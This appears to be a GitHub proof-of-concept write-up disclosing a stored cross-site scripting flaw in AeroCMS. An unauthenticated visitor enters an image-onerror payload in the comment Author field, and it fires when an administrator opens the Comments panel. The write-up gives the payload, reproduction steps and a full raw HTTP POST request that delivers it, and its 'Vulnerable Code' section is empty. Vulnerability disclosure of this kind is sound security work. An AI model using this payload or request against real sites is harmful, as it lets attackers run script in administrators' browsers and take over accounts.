# AeroCMS-Comment-Stored_XSS-POC
* `Description` Don't need register or login account 
## Step to Reproduct
* Click `Read More` -> input payload `<img/src/onerror=prompt(10)>` at `Author` -> click `Submit` button 
# Exploit
* Input payload at `Author` -> click `Submit` button
![image](https://user-images.githubusercontent.com/79050415/157009053-539e0d0f-8de7-449f-9815-2059c15179ab.png)
* When admin login to admin panel and click `Comments` -> The XSS will trigger 
![image](https://user-images.githubusercontent.com/79050415/157009623-8afdecf4-8bfc-48ed-be9c-a298628eeb5f.png)
* Finally, Success !!!!
![image](https://user-images.githubusercontent.com/79050415/157009805-fc9c33bb-7ae9-4229-9051-081c23d72b92.png)
# Vulnerable Code

# POC
```c
POST /AeroCMS/post.php?p_id=36 HTTP/1.1
Host: localhost:8080
Content-Length: 126
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="95", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8080/AeroCMS/post.php?p_id=36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=loqbt1ibs376hge1s415srq441
Connection: close

comment_author=%3Cimg%2Fsrc%2Fonerror%3Dprompt%2810%29%3E&comment_email=bin%40gmail.com&comment_content=hacked&create_comment=
```
`POC VIDEO` https://drive.google.com/file/d/1GxOyX1JkG0trfdaCLfe06TR6WLIGoUXE/view?usp=sharing
